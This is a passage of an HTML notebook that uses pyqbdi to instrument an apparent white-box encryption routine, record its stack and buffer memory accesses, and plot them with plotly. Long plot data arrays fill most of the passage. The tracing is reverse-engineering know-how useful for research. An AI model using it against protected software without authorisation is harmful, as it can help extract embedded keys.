class=\"c1\"># Keep a counter on the number of memory access</span>\n    <span class=\"n\">ctr</span> <span class=\"o\">=</span> <span class=\"n\">cb_data</span><span class=\"p\">[</span><span class=\"s2\">\"ctr\"</span><span class=\"p\">]</span>\n    <span class=\"n\">memaccess</span> <span class=\"o\">=</span> <span class=\"n\">vm</span><span class=\"o\">.</span><span class=\"n\">getInstMemoryAccess</span><span class=\"p\">()</span>\n    <span class=\"k\">for</span> <span class=\"n\">acc</span> <span class=\"ow\">in</span> <span class=\"n\">memaccess</span><span class=\"p\">:</span>\n        <span class=\"n\">rw_type</span> <span class=\"o\">=</span> <span class=\"p\">[</span><span class=\"s2\">\"write\"</span><span class=\"p\">,</span> <span class=\"s2\">\"read\"</span><span class=\"p\">][</span><span class=\"ow\">not</span> <span class=\"p\">(</span><span class=\"n\">acc</span><span class=\"o\">.</span><span class=\"n\">type</span> <span class=\"o\">&amp;</span> <span class=\"n\">pyqbdi</span><span class=\"o\">.</span><span class=\"n\">MEMORY_WRITE</span><span class=\"p\">)]</span>\n        <span class=\"c1\"># If the accessed address is from the stack</span>\n        <span class=\"k\">if</span> <span class=\"n\">acc</span><span class=\"o\">.</span><span class=\"n\">accessAddress</span> <span class=\"ow\">in</span> <span class=\"nb\">range</span><span class=\"p\">(</span><span class=\"n\">stack</span><span class=\"o\">-</span><span class=\"mh\">0x1000000</span><span class=\"p\">,</span> <span class=\"n\">stack</span><span class=\"p\">):</span>\n            <span class=\"n\">rw_type</span> <span class=\"o\">=</span> <span class=\"s2\">\"stack_\"</span> <span class=\"o\">+</span> <span class=\"n\">rw_type</span>\n        <span class=\"c1\"># If the accessed address is from the provided buffer</span>\n        <span class=\"k\">elif</span> <span class=\"n\">acc</span><span class=\"o\">.</span><span class=\"n\">accessAddress</span> <span class=\"ow\">in</span> <span class=\"nb\">range</span><span class=\"p\">(</span><span class=\"n\">buffer_ptr</span><span class=\"p\">,</span> <span class=\"n\">buffer_ptr</span><span class=\"o\">+</span><span class=\"mi\">16</span><span class=\"p\">):</span>\n            <span class=\"n\">rw_type</span> <span class=\"o\">=</span> <span class=\"s2\">\"buffer_\"</span> <span class=\"o\">+</span> <span class=\"n\">rw_type</span>\n\n        <span class=\"c1\"># Store information about the memory access</span>\n        <span class=\"n\">accesses</span><span class=\"o\">.</span><span class=\"n\">append</span><span class=\"p\">({</span><span class=\"s2\">\"id\"</span><span class=\"p\">:</span><span class=\"n\">ctr</span><span class=\"p\">,</span> <span class=\"s2\">\"access\"</span><span class=\"p\">:</span> <span class=\"n\">acc</span><span class=\"o\">.</span><span class=\"n\">accessAddress</span><span class=\"p\">,</span> <span class=\"s2\">\"type\"</span><span class=\"p\">:</span><span class=\"n\">rw_type</span><span class=\"p\">,</span> <span class=\"s2\">\"size\"</span><span class=\"p\">:</span><span class=\"n\">acc</span><span class=\"o\">.</span><span class=\"n\">size</span><span class=\"p\">})</span>\n        <span class=\"n\">cb_data</span><span class=\"p\">[</span><span class=\"s2\">\"ctr\"</span><span class=\"p\">]</span> <span class=\"o\">+=</span> <span class=\"mi\">1</span>\n    <span class=\"k\">return</span> <span class=\"n\">pyqbdi</span><span class=\"o\">.</span><span class=\"n\">CONTINUE</span>\n</pre> \n  </div> \n  <div class=\"highlight\"> \n   <pre><span></span><span class=\"k\">def</span> <span class=\"nf\">main</span><span class=\"p\">():</span>\n    <span class=\"n\">encrypt_ptr</span> <span class=\"o\">=</span> <span class=\"n\">load_wb</span><span class=\"p\">()</span>\n    <span class=\"n\">vm</span> <span class=\"o\">=</span> <span class=\"n\">instanciate_vm</span><span class=\"p\">(</span><span class=\"n\">encrypt_ptr</span><span class=\"p\">)</span>\n\n    <span class=\"n\">buffer_ptr</span> <span class=\"o\">=</span> <span class=\"n\">pyqbdi</span><span class=\"o\">.</span><span class=\"n\">allocateMemory</span><span class=\"p\">(</span><span class=\"mi\">16</span><span class=\"p\">)</span>\n\n    <span class=\"c1\"># Add memory callback</span>\n    <span class=\"n\">state</span> <span class=\"o\">=</span> <span class=\"n\">vm</span><span class=\"o\">.</span><span class=\"n\">getGPRState</span><span class=\"p\">()</span>\n    <span class=\"n\">cb_data</span> <span class=\"o\">=</span> <span class=\"p\">{</span><span class=\"s2\">\"accesses\"</span><span class=\"p\">:[],</span> <span class=\"s2\">\"ctr\"</span><span class=\"p\">:</span><span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"s2\">\"stack\"</span><span class=\"p\">:</span><span class=\"n\">state</span><span class=\"o\">.</span><span class=\"n\">rsp</span><span class=\"p\">,</span> <span class=\"s2\">\"buffer_ptr\"</span><span class=\"p\">:</span><span class=\"n\">buffer_ptr</span><span class=\"p\">}</span>\n    <span class=\"n\">vm</span><span class=\"o\">.</span><span class=\"n\">addMemAccessCB</span><span class=\"p\">(</span><span class=\"n\">pyqbdi</span><span class=\"o\">.</span><span class=\"n\">MEMORY_READ_WRITE</span><span class=\"p\">,</span> <span class=\"n\">mem_cbk</span><span class=\"p\">,</span> <span class=\"n\">cb_data</span><span class=\"p\">)</span>\n\n    <span class=\"n\">state</span> <span class=\"o\">=</span> <span class=\"n\">encrypt</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">,</span> <span class=\"n\">encrypt_ptr</span><span class=\"p\">,</span> <span class=\"n\">buffer_ptr</span><span class=\"p\">,</span> <span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">]</span><span class=\"o\">*</span><span class=\"mi\">16</span><span class=\"p\">)</span>\n    <span class=\"k\">return</span> <span class=\"n\">cb_data</span>\n\n<span class=\"n\">memory_accesses</span> <span class=\"o\">=</span> <span class=\"n\">main</span><span class=\"p\">()</span>\n</pre> \n  </div> \n  <div class=\"highlight\"> \n   <pre><span></span><span class=\"kn\">import</span> <span class=\"nn\">plotly.express</span> <span class=\"k\">as</span> <span class=\"nn\">px</span>\n\n<span class=\"n\">fig</span> <span class=\"o\">=</span> <span class=\"n\">px</span><span class=\"o\">.</span><span class=\"n\">scatter</span><span class=\"p\">(</span><span class=\"n\">memory_accesses</span><span class=\"p\">[</span><span class=\"s2\">\"accesses\"</span><span class=\"p\">],</span> <span class=\"n\">x</span><span class=\"o\">=</span><span class=\"s2\">\"id\"</span><span class=\"p\">,</span> <span class=\"n\">y</span><span class=\"o\">=</span><span class=\"s2\">\"access\"</span><span class=\"p\">,</span> <span class=\"n\">color</span><span class=\"o\">=</span><span class=\"s2\">\"type\"</span><span class=\"p\">,</span> <span class=\"n\">size</span><span class=\"o\">=</span><span class=\"s2\">\"size\"</span><span class=\"p\">)</span>\n<span class=\"n\">fig</span><span class=\"o\">.</span><span class=\"n\">show</span><span class=\"p\">()</span>\n</pre> \n  </div> \n  <div> \n   <div id=\"9e90807e-da07-46d0-81af-26373aae16af\" class=\"plotly-graph-div\" style=\"height:525px; width:100%;\"></div> \n   <script type=\"text/javascript\"> window.PLOTLYENV=window.PLOTLYENV || {}; if (document.getElementById(\"9e90807e-da07-46d0-81af-26373aae16af\")) { Plotly.newPlot( '9e90807e-da07-46d0-81af-26373aae16af', [{\"hoverlabel\": {\"namelength\": 0}, \"hovertemplate\": \"type=stack_write<br>id=%{x}<br>access=%{y}<br>size=%{marker.size}\", \"legendgroup\": \"stack_write\", \"marker\": {\"color\": \"#636efa\", \"size\": [8, 8, 8, 8, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1], \"sizemode\": \"area\", \"sizeref\": 0.02, \"symbol\": \"circle\"}, \"mode\": \"markers\", \"name\": \"stack_write\", \"showlegend\": true, \"type\": \"scattergl\", \"x\": [0, 1, 5, 6, 10, 14, 18, 22, 26, 30, 34, 38, 42, 46, 50, 54, 58, 62, 66, 70, 74, 78, 82, 86, 90, 94, 98, 102, 111, 120, 129, 133, 137, 146, 155, 164, 168, 177, 186, 190, 199, 208, 217, 221, 230, 239, 248, 257, 266, 270, 274, 283, 292, 301, 305, 314, 323, 327, 336, 345, 354, 358, 367, 376, 385, 394, 403, 407, 411, 420, 429, 438, 442, 451, 460, 464, 473, 482, 491, 495, 504, 513, 522, 531, 540, 544, 548, 557, 566, 575, 579, 588, 597, 601, 610, 619, 628, 632, 641, 650, 654, 658, 662, 666, 670, 674, 678, 682, 686, 690, 694, 698, 702, 706, 710, 714, 718, 722, 726, 730, 734, 738, 742, 746, 755, 764, 773, 777, 781, 790, 799, 808, 812, 821, 830, 834, 843, 852, 861, 865, 874, 883, 892, 901, 910, 914, 918, 927, 936, 945, 949, 958, 967, 971, 980, 989, 998, 1002, 1011, 1020, 1029, 1038, 1047, 1051, 1055, 1064, 1073, 1082, 1086, 1095, 1104, 1108, 1117, 1126, 1135, 1139, 1148, 1157, 1166, 1175, 1184, 1188, 1192, 1201, 1210, 1219, 1223, 1232, 1241, 1245, 1254, 1263, 1272, 1276, 1285, 1294, 1298, 1302, 1306, 1310, 1314, 1318, 1322, 1326, 1330, 1334, 1338, 1342, 1346, 1350, 1354, 1358, 1362, 1366, 1370, 1374, 1378, 1382, 1386, 1390, 1399, 1408, 1417, 1421, 1425, 1434, 1443, 1452, 1456, 1465, 1474, 1478, 1487, 1496, 1505, 1509, 1518, 1527, 1536, 1545, 1554, 1558, 1562, 1571, 1580, 1589, 1593, 1602, 1611, 1615, 1624, 1633, 1642, 1646, 1655, 1664, 1673, 1682, 1691, 1695, 1699, 1708, 1717, 1726, 1730, 1739, 1748, 1752, 1761, 1770, 1779, 1783, 1792, 1801, 1810, 1819, 1828, 1832, 1836, 1845, 1854, 1863, 1867, 1876, 1885, 1889, 1898, 1907, 1916, 1920, 1929, 1938, 1942, 1946, 1950, 1954, 1958, 1962, 1966, 1970, 1974, 1978, 1982, 1986, 1990, 1994, 1998, 2002, 2006, 2010, 2014, 2018, 2022, 2026, 2030, 2034, 2043, 2052, 2061, 2065, 2069, 2078, 2087, 2096, 2100, 2109, 2118, 2122, 2131, 2140, 2149, 2153, 2162, 2171, 2180, 2189, 2198, 2202, 2206, 2215, 2224, 2233, 2237, 2246, 2255, 2259, 2268, 2277, 2286, 2290, 2299, 2308, 2317, 2326, 2335, 2339, 2343, 2352, 2361, 2370, 2374, 2383, 2392, 2396, 2405, 2414, 2423, 2427, 2436, 2445, 2454, 2463, 2472, 2476, 2480, 2489, 2498, 2507, 2511, 2520, 2529, 2533, 2542, 2551, 2560, 2564, 2573, 2582, 2586, 2590, 2594, 2598, 2602, 2606, 2610, 2614, 2618, 2622, 2626, 2630, 2634, 2638, 2642, 2646, 2650, 2654, 2658, 2662, 2666, 2670, 2674, 2678, 2687, 2696, 2705, 2709, 2713, 2722, 2731, 2740, 2744, 2753, 2762, 2766, 2775, 2784, 2793, 2797, 2806, 2815, 2824, 2833, 2842, 2846, 2850, 2859, 2868, 2877, 2881, 2890, 2899, 2903, 2912, 2921, 2930, 2934, 2943, 2952, 2961, 2970, 2979, 2983, 2987, 2996, 3005, 3014, 3018, 3027, 3036, 3040, 3049, 3058, 3067, 3071, 3080, 3089, 3098, 3107, 3116, 3120, 3124, 3133, 3142, 3151, 3155, 3164, 3173, 3177, 3186, 3195, 3204, 3208, 3217, 3226, 3230, 3234, 3238, 3242, 3246, 3250, 3254, 3258, 3262, 3266, 3270, 3274, 3278, 3282, 3286, 3290, 3294, 3298, 3302, 3306, 3310, 3314, 3318, 3322, 3331, 3340, 3349, 3353, 3357, 3366, 3375, 3384, 3388, 3397, 3406, 3410, 3419, 3428, 3437, 3441, 3450, 3459, 3468, 3477, 3486, 3490, 3494, 3503, 3512, 3521, 3525, 3534, 3543, 3547, 3556, 3565, 3574, 3578, 3587, 3596, 3605, 3614, 3623, 3627, 3631, 3640, 3649, 3658, 3662, 3671, 3680, 3684, 3693, 3702, 3711, 3715, 3724, 3733, 3742, 3751, 3760, 3764, 3768, 3777, 3786, 3795, 3799, 3808, 3817, 3821, 3830, 3839, 3848, 3852, 3861, 3870, 3874, 3878, 3882, 3886, 3890, 3894, 3898, 3902, 3906, 3910, 3914, 3918, 3922, 3926, 3930, 3934, 3938, 3942, 3946, 3950, 3954, 3958, 3962, 3966, 3975, 3984, 3993, 3997, 4001, 4010, 4019, 4028, 4032, 4041, 4050, 4054, 4063, 4072, 4081, 4085, 4094, 4103, 4112, 4121, 4130, 4134, 4138, 4147, 4156, 4165, 4169, 4178, 4187, 4191, 4200, 4209, 4218, 4222, 4231, 4240, 4249, 4258, 4267, 4271, 4275, 4284, 4293, 4302, 4306, 4315, 4324, 4328, 4337, 4346, 4355, 4359, 4368, 4377, 4386, 4395, 4404, 4408, 4412, 4421, 4430, 4439, 4443, 4452, 4461, 4465, 4474, 4483, 4492, 4496, 4505, 4514, 4518, 4522, 4526, 4530, 4534, 4538, 4542, 4546, 4550, 4554, 4558, 4562, 4566, 4570, 4574, 4578, 4582, 4586, 4590, 4594, 4598, 4602, 4606, 4610, 4614, 4618, 4622, 4626, 4630, 4634, 4638, 4642, 4646, 4650, 4654, 4658, 4662, 4666, 4670, 4674, 4678, 4682, 4686, 4690, 4694, 4703, 4712, 4721, 4730, 4739, 4748, 4752, 4756, 4760, 4769, 4778, 4782, 4791, 4800, 4809, 4818, 4822, 4826, 4835, 4844, 4853, 4862, 4866, 4870, 4879, 4888, 4897, 4906, 4915, 4924, 4928, 4932, 4941, 4950, 4959, 4968, 4977, 4986, 4995, 5004, 5013, 5022, 5026, 5030, 5034, 5043, 5052, 5056, 5065, 5074, 5083, 5092, 5096, 5100, 5109, 5118, 5127, 5136, 5140, 5144, 5153, 5162, 5171, 5180, 5189, 5198, 5202, 5206, 5215, 5224, 5233, 5242, 5251, 5260, 5269, 5278, 5287, 5296, 5300, 5304, 5308, 5317, 5326, 5330, 5339, 5348, 5357, 5366, 5370, 5374, 5383, 5392, 5401, 5410, 5414, 5418, 5427, 5436, 5445, 5454, 5463, 5472, 5476, 5480, 5489, 5498, 5507, 5516, 5525, 5534, 5543, 5552, 5561, 5570, 5574, 5578, 5582, 5591, 5600, 5604, 5613, 5622, 5631, 5640, 5644, 5648, 5657, 5666, 5675, 5684, 5688, 5692, 5701, 5710, 5719, 5728, 5737, 5746, 5750, 5754, 5763, 5772, 5781, 5790, 5794, 5798, 5802, 5806, 5810, 5814, 5818, 5822, 5826, 5830, 5834, 5838, 5842, 5846, 5850, 5854, 5858, 5862, 5866, 5870, 5874, 5878, 5882, 5886, 5890, 5894, 5898, 5902, 5906, 5910, 5914, 5918, 5922, 5926, 5930, 5934, 5938, 5942, 5946, 5950, 5954, 5958, 5962, 5966, 5970, 5974, 5978, 5982, 5991, 6000, 6009, 6018, 6027, 6036, 6040, 6044, 6048, 6057, 6066, 6070, 6079, 6088, 6097, 6106, 6110, 6114, 6123, 6132, 6141, 6150, 6154, 6158, 6167, 6176, 6185, 6194, 6203, 6212, 6216, 6220, 6229, 6238, 6247, 6256, 6265, 6274, 6283, 6292, 6301, 6310, 6314, 6318, 6322, 6331, 6340, 6344, 6353, 6362, 6371, 6380, 6384, 6388, 6397, 6406, 6415, 6424, 6428, 6432, 6441, 6450, 6459, 6468, 6477, 6486, 6490, 6494, 6503, 6512, 6521, 6530, 6539, 6548, 6557, 6566, 6575, 6584, 6588, 6592, 6596, 6605, 6614, 6618, 6627, 6636, 6645, 6654, 6658, 6662, 6671, 6680, 6689, 6698, 6702, 6706, 6715, 6724, 6733, 6742, 6751, 6760, 6764, 6768, 6777, 6786, 6795, 6804, 6813, 6822, 6831, 6840, 6849, 6858, 6862, 6866, 6870, 6879, 6888, 6892, 6901, 6910, 6919, 6928, 6932, 6936, 6945, 6954, 6963, 6972, 6976, 6980, 6989, 6998, 7007, 7016, 7025, 7034, 7038, 7042, 7051, 7060, 7069, 7078, 7082, 7086, 7090, 7094, 7098, 7102, 7106, 7110, 7114, 7118, 7122, 7126, 7130, 7134, 7138, 7142, 7146, 7150, 7154, 7158, 7162, 7166, 7170, 7174, 7178, 7182, 7186, 7190, 7194, 7198, 7202, 7206, 7210, 7214, 7218, 7222, 7226, 7230, 7234, 7238, 7242, 7246, 7250, 7254, 7258, 7262, 7266, 7270, 7279, 7288, 7297, 7306, 7310, 7314, 7323, 7332, 7341, 7350, 7354, 7358, 7367, 7376, 7385, 7394, 7398, 7402, 7411, 7420, 7429, 7438, 7442, 7446, 7455, 7464, 7473, 7482, 7486, 7490, 7499, 7508, 7517, 7526, 7530, 7534, 7543, 7552, 7561, 7570, 7574, 7578, 7587, 7596, 7605, 7614, 7618, 7622, 7631, 7640, 7649, 7658, 7662, 7666, 7675, 7684, 7693, 7702, 7706, 7710, 7719, 7728, 7737, 7746, 7750, 7754, 7763, 7772, 7781, 7790, 7794, 7798, 7807, 7816, 7825, 7834, 7838, 7842, 7851, 7860, 7869, 7878, 7882, 7886, 7895, 7904, 7913, 7922, 7926, 7930, 7939, 7948, 7957, 7966, 7970, 7974, 7983, 7992, 8001, 8010, 8019, 8028, 8037, 8046, 8055, 8064, 8073, 8082, 8091, 8100, 8109, 8118], \"xaxis\": \"x\", \"y\": [140224210382720, 140224210382664, 140224210382672, 140224210382680, 140224210382688, 140224210382673, 140224210382677, 140224210382681, 140224210382685, 140224210382688, 140224210382674, 140224210382682, 140224210382688, 140224210382678, 140224210382686, 140224210382688, 140224210382675, 140224210382687, 140224210382683, 140224210382679, 140224210382688, 140224210382672, 140224210382689, 140224210382676, 140224210382690, 140224210382680, 140224210382691, 140224210382684, 140224210382691, 140224210382692, 140224210382688, 140224210382689, 140224210382691, 140224210382690, 140224210382672, 140224210382690, 140224210382690, 140224210382690, 140224210382673, 140224210382692, 140224210382690, 140224210382674, 140224210382690, 140224210382690, 140224210382690, 140224210382675, 140224210382691, 140224210382692, 140224210382688, 140224210382689, 140224210382691, 140224210382690, 140224210382676, 140224210382690, 140224210382690, 140224210382690, 140224210382677, 140224210382692, 140224210382690, 140224210382678, 140224210382690, 140224210382690, 140224210382690, 140224210382679, 140224210382691, 140224210382692, 140224210382688, 140224210382689, 140224210382691, 140224210382690, 140224210382680, 140224210382690, 140224210382690, 140224210382690, 140224210382681, 140224210382692, 140224210382690, 140224210382682, 140224210382690, 140224210382690, 140224210382690, 140224210382683, 140224210382691, 140224210382692, 140224210382688, 140224210382689, 140224210382691, 140224210382690, 140224210382684, 140224210382690, 140224210382690, 140224210382690, 140224210382685, 140224210382692, 140224210382690, 140224210382686, 140224210382690, 140224210382690, 140224210382690, 140224210382687, 140224210382688, 140224210382673, 140224210382677, 140224210382681, 140224210382685, 140224210382688, 140224210382674, 140224210382682, 140224210382688, 140224210382678, 140224210382686, 140224210382688, 140224210382675, 140224210382687, 140224210382683, 140224210382679, 140224210382688, 140224210382672, 140224210382689, 140224210382676, 140224210382690, 140224210382680, 140224210382691, 140224210382684, 140224210382691, 140224210382692, 140224210382688, 140224210382689, 140224210382691, 140224210382690, 140224210382672, 140224210382690, 140224210382690, 140224210382690, 140224210382673, 140224210382692, 140224210382690, 140224210382674, 140224210382690, 140224210382690, 140224210382690, 140224210382675, 140224210382691, 140224210382692, 140224210382688, 140224210382689, 140224210382691, 140224210382690, 140224210382676, 140224210382690, 140224210382690, 140224210382690, 140224210382677, 140224210382692, 140224210382690, 140224210382678, 140224210382690, 140224210382690, 140224210382690, 140224210382679, 140224210382691, 140224210382692, 140224210382688, 140224210382689, 140224210382691, 140224210382690, 140224210382680, 140224210382690, 140224210382690, 140224210382690, 140224210382681, 140224210382692, 140224210382690, 140224210382682, 140224210382690, 140224210382690, 140224210382690, 140224210382683, 140224210382691, 140224210382692, 140224210382688, 140224210382689, 140224210382691, 140224210382690, 140224210382684, 140224210382690, 140224210382690, 140224210382690, 140224210382685, 140224210382692, 140224210382690, 140224210382686, 140224210382690, 140224210382690, 140224210382690, 140224210382687, 140224210382688, 140224210382673, 140224210382677, 140224210382681, 140224210382685, 140224210382688, 140224210382674, 140224210382682, 140224210382688, 140224210382678, 140224210382686, 140224210382688, 140224210382675, 140224210382687, 140224210382683, 140224210382679, 140224210382688, 140224210382672, 140224210382689, 140224210382676, 140224210382690, 140224210382680, 140224210382691, 140224210382684, 140224210382691, 140224210382692, 140224210382688, 140224210382689, 140224210382691, 140224210382690, 140224210382672, 140224210382690, 140224210382690, 140224210382690, 140224210382673, 140224210382692, 140224210382690, 140224210382674, 140224210382690, 140224210382690, 140224210382690, 140224210382675, 140224210382691, 140224210382692, 140224210382688, 140224210382689, 140224210382691, 140224210382690, 140224210382676, 140224210382690, 140224210382690, 140224210382690, 140224210382677, 140224210382692, 140224210382690, 140224210382678, 140224210382690, 140224210382690, 140224210382690, 140224210382679, 140224210382691, 140224210382692, 140224210382688, 140224210382689, 140224210382691, 140224210382690, 140224210382680, 140224210382690, 140224210382690, 140224210382690, 140224210382681, 140224210382692, 140224210382690, 140224210382682, 140224210382690, 140224210382690, 140224210382690, 140224210382683, 140224210382691, 140224210382692, 140224210382688, 140224210382689, 140224210382691, 140224210382690, 140224210382684, 140224210382690, 140224210382690, 140224210382690, 140224210382685, 140224210382692, 140224210382690, 140224210382686, 140224210382690, 140224210382690, 140224210382690, 140224210382687, 140224210382688, 140224210382673, 140224210382677, 140224210382681, 140224210382685, 140224210382688, 140224210382674, 140224210382682, 140224210382688, 140224210382678, 140224210382686, 140224210382688, 140224210382675, 140224210382687, 140224210382683, 140224210382679, 140224210382688, 140224210382672, 140224210382689, 140224210382676, 140224210382690, 140224210382680, 140224210382691, 140224210382684, 140224210382691, 140224210382692, 140224210382688, 140224210382689, 140224210382691, 140224210382690, 140224210382672, 140224210382690, 140224210382690, 140224210382690, 140224210382673, 140224210382692, 140224210382690, 140224210382674, 140224210382690, 140224210382690, 140224210382690, 140224210382675, 140224210382691, 140224210382692, 140224210382688, 140224210382689, 140224210382691, 140224210382690, 140224210382676, 140224210382690, 140224210382690, 140224210382690, 140224210382677, 140224210382692, 140224210382690, 140224210382678, 140224210382690, 140224210382690, 140224210382690, 140224210382679, 140224210382691, 140224210382692, 140224210382688, 140224210382689, 140224210382691, 140224210382690, 140224210382680, 140224210382690, 140224210382690, 140224210382690, 140224210382681, 140224210382692, 140224210382690, 140224210382682, 140224210382690, 140224210382690, 140224210382690, 140224210382683, 140224210382691, 140224210382692, 140224210382688, 140224210382689, 140224210382691, 140224210382690, 140224210382684, 140224210382690, 140224210382690, 140224210382690, 140224210382685, 140224210382692, 140224210382690, 140224210382686, 140224210382690, 140224210382690, 140224210382690, 140224210382687, 140224210382688, 140224210382673, 140224210382677, 140224210382681, 140224210382685, 140224210382688, 140224210382674, 140224210382682, 140224210382688, 140224210382678, 140224210382686, 140224210382688, 140224210382675, 140224210382687, 140224210382683, 140224210382679, 140224210382688, 140224210382672, 